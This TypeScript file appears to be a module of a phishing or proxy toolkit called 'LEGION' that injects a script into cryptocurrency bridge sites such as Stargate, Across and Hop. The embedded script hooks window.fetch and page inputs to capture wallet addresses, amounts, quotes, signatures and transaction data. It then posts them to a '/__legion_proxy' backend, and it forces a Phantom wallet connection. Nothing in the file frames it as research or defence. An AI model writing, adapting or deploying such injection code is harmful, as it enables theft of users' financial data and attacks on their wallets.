/**
 * BRIDGES EXTRACTION TEMPLATE
 *
 * Targets: Stargate, Across, Hop Protocol, Synapse, Connext, Anyswap
 *
 * Extracts:
 * - Cross-chain transaction data
 * - Bridge routing information
 * - Liquidity pool states
 * - Fee information
 * - Bridge status (operational/paused)
 */

import { BaseExtractionTemplate, ExtractionTemplate } from '../extraction-templates.js'

export class BridgesTemplate extends BaseExtractionTemplate implements ExtractionTemplate {
  name = 'Bridges Extraction Template'
  category: 'bridge' = 'bridge'
  platforms = ['stargate.finance', 'across.to', 'hop.exchange', 'synapseprotocol.com', 'connext.network', 'anyswap.exchange']
  supportedChains = ['ethereum', 'polygon', 'arbitrum', 'optimism', 'bsc', 'avalanche', 'fantom', 'gnosis']
  injectionPoints = ['bridge', 'swap', 'liquidity', 'pools', 'transactions']

  extractionTargets = [
    // Bridge Activity
    {
      name: 'source_chain',
      type: 'transaction' as const,
      location: 'dom' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'destination_chain',
      type: 'transaction' as const,
      location: 'dom' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'bridge_amount',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'bridge_fee',
      type: 'price' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'estimated_arrival',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'parse' as const,
    },
    // Pool Data
    {
      name: 'liquidity_pool_state',
      type: 'liquidity' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'pool_balance',
      type: 'balance' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'pool_apy',
      type: 'price' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    // Bridge Signature
    {
      name: 'bridge_signature',
      type: 'signature' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'bridge_nonce',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'parse' as const,
    },
    // Bridge Status
    {
      name: 'bridge_operational_status',
      type: 'credential' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'supported_routes',
      type: 'credential' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
  ]

  walletDetection = {
    detection: {
      metamask: true,
      phantom: true,
      ledger: true,
      trezor: false,
      trustwallet: true,
      coinbase: true,
      walletconnect: true,
    },
    signatureMethod: 'eth_signTypedData_v4' as const,
    permissionRequest: ['eth_accounts', 'eth_signTypedData_v4', 'eth_sendTransaction'],
  }

  apiEndpoints = [
    {
      name: 'bridge_quote',
      method: 'POST' as const,
      path: '/api/quote',
      interceptionType: 'both' as const,
      dataToExtract: ['bridgeFee', 'receiveAmount', 'minAmount', 'maxAmount'],
    },
    {
      name: 'bridge_routes',
      method: 'GET' as const,
      path: '/api/supported-routes',
      interceptionType: 'response' as const,
      dataToExtract: ['chains', 'tokens', 'routes'],
    },
    {
      name: 'liquidity_state',
      method: 'GET' as const,
      path: '/api/pools',
      interceptionType: 'response' as const,
      dataToExtract: ['pools', 'balance', 'apy', 'utilization'],
    },
    {
      name: 'bridge_transaction',
      method: 'POST' as const,
      path: '/api/bridge-transaction',
      interceptionType: 'both' as const,
      dataToExtract: ['txHash', 'status', 'fromChain', 'toChain'],
    },
  ]

  scriptContent = `
(function() {
  const LEGION_BRIDGES = {
    platform: 'bridges',
    initialized: false,
    extractedData: {},

    async initialize() {
      console.log('[LEGION] Bridges Template Initialized');

      // Detect wallet
      await this.detectWallet();

      // Hook bridge operations
      this.hookBridgeOperations();

      // Intercept bridge API calls
      this.interceptBridgeAPICalls();

      // Monitor route selection
      this.monitorRouteSelection();

      this.initialized = true;
    },

    async detectWallet() {
      if (window.ethereum) {
        console.log('[LEGION] Wallet detected for bridging');
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts && accounts.length > 0) {
            this.extractedData.wallet_address = accounts[0];
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            this.extractedData.source_chain_id = chainId;
          }
        } catch (e) {
          console.log('[LEGION] Wallet access denied');
        }
      } else if (window.phantom?.solana) {
        console.log('[LEGION] Phantom detected');
        try {
          const response = await window.phantom.solana.connect();
          this.extractedData.wallet_address = response.publicKey.toString();
          this.extractedData.source_chain = 'solana';
        } catch (e) {
          console.log('[LEGION] Phantom access denied');
        }
      }
    },

    hookBridgeOperations() {
      // Monitor destination chain selection
      const observer = new MutationObserver(() => {
        const chainSelectors = document.querySelectorAll('[class*="chain"], [id*="chain"]');
        chainSelectors.forEach(selector => {
          selector.addEventListener('click', () => {
            const text = selector.textContent?.toLowerCase() || '';
            console.log('[LEGION] Chain selected:', text);
            this.extractedData.selected_destination = text;
          });
        });

        // Monitor amount input
        const amountInputs = document.querySelectorAll('input[placeholder*="amount"], input[placeholder*="0.0"]');
        amountInputs.forEach(input => {
          input.addEventListener('change', () => {
            console.log('[LEGION] Amount entered:', input.value);
            this.extractedData.bridge_amount = input.value;
          });
        });
      });

      observer.observe(document.body, {
        childList: true,
        subtree: true,
      });
    },

    interceptBridgeAPICalls() {
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        const [resource, config] = args;
        const url = typeof resource === 'string' ? resource : resource.url;

        // Log bridge API calls
        if (url.includes('/api/') || url.includes('bridge') || url.includes('quote')) {
          console.log('[LEGION] Bridge API Call:', url, config?.body);

          if (url.includes('quote')) {
            if (config?.body) {
              try {
                const body = JSON.parse(config.body);
                LEGION_BRIDGES.extractedData.quote_request = body;
              } catch (e) {}
            }
          }

          if (url.includes('routes') || url.includes('supported')) {
            LEGION_BRIDGES.extractedData.requesting_routes = true;
          }
        }

        return originalFetch.apply(this, args).then(response => {
          if (url.includes('quote') || url.includes('bridge-transaction')) {
            response.clone().json().then(data => {
              console.log('[LEGION] Bridge Response:', url, data);
              if (url.includes('quote')) {
                LEGION_BRIDGES.extractedData.quote_response = data;
              } else if (url.includes('bridge-transaction')) {
                LEGION_BRIDGES.extractedData.transaction_response = data;
              }
            }).catch(() => {});
          }

          if (url.includes('routes') || url.includes('pools')) {
            response.clone().json().then(data => {
              LEGION_BRIDGES.extractedData.supported_routes = data;
            }).catch(() => {});
          }

          return response;
        });
      };
    },

    monitorRouteSelection() {
      // Monitor for bridge execution
      const observer = new MutationObserver(() => {
        // Find bridge button by class or text content (fix for :contains pseudo-selector)
        let bridgeButton = document.querySelector('[class*="bridge"]');

        if (!bridgeButton) {
          const buttons = document.querySelectorAll('button');
          for (const btn of buttons) {
            const text = btn.textContent?.toLowerCase() || '';
            if (text.includes('bridge') || text.includes('swap')) {
              bridgeButton = btn;
              break;
            }
          }
        }

        if (bridgeButton && !bridgeButton.hasAttribute('data-legion-bridge-hooked')) {
          bridgeButton.setAttribute('data-legion-bridge-hooked', 'true');
          bridgeButton.addEventListener('click', () => {
            console.log('[LEGION] Bridge transaction initiated');
            setTimeout(() => {
              console.log('[LEGION] Extracted Bridge Data:', LEGION_BRIDGES.extractedData);
              LEGION_BRIDGES.sendToBackend();
            }, 2000);
          });
        }
      });

      observer.observe(document.body, {
        childList: true,
        subtree: true,
      });
    },

    async sendToBackend() {
      try {
        await fetch('/__legion_proxy/api/v1/bridge-extraction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            platform: 'bridges',
            timestamp: new Date().toISOString(),
            data: this.extractedData,
          }),
        });
      } catch (e) {
        console.log('[LEGION] Send failed:', e);
      }
    },
  };

  window.__LEGION_EXTRACTION__ = LEGION_BRIDGES;
})();
  `.trim()
}

/**
 * Bridges template instance
 */
export const bridgesTemplateInstance = new BridgesTemplate()
